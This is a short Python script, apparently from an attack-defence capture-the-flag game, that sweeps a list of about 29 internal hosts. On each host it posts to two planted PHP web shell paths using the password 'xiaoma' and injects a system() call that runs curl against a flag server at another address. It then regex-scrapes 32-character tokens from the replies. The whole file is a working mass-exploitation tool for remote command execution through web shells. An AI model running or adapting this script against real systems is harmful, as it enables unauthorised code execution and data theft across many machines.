import requests
import re
from requests.exceptions import RequestException

shells = {'/upload/url/8BD85970CDABBB07ECE61833D8FF2CFD.php': 'xiaoma', '/user/nichengx.php': 'xiaoma'}

flag = 'http://10.1.8.26/remoteflag/'

ips = ["10.1.8.21:80",
       "10.1.8.22:80",
       "10.1.8.24:80",
       "10.1.8.25:80",
       "10.1.8.28:80",
       "10.1.8.29:80",
       "10.1.8.32:80",
       "10.1.8.33:80",
       "10.1.8.34:80",
       "10.1.8.36:80",
       "10.1.8.37:80",
       "10.1.8.39:80",
       "10.1.8.41:80",
       "10.1.8.42:80",
       "10.1.8.43:80",
       "10.1.8.44:80",
       "10.1.8.45:80",
       "10.1.8.47:80",
       "10.1.8.49:80",
       "10.1.8.50:80",
       "10.1.8.54:80",
       "10.1.8.55:80",
       "10.1.8.56:80",
       "10.1.8.57:80",
       "10.1.8.67:80",
       "10.1.8.68:80",
       "10.1.8.70:80",
       "10.1.8.75:80",
       "10.1.8.83:80", ]

headers = {'Content-Type': 'application/x-www-form-urlencoded'}
pattern = re.compile(b'\w{32}')
for target in ips:
    for shell in shells:
        header = headers.copy()
        header['Referer'] = target
        try:
            res = requests.post('http://' + target + shell,
                                data="%s=system('curl http://10.1.8.26/remoteflag/');" % shells[shell], timeout=3,
                                headers=header,
                                # proxies={'http': 'http://127.0.0.1:8080'}
                                )
            if res.status_code != 404:
                print(pattern.findall(res.content))
                break
        except RequestException:
            pass
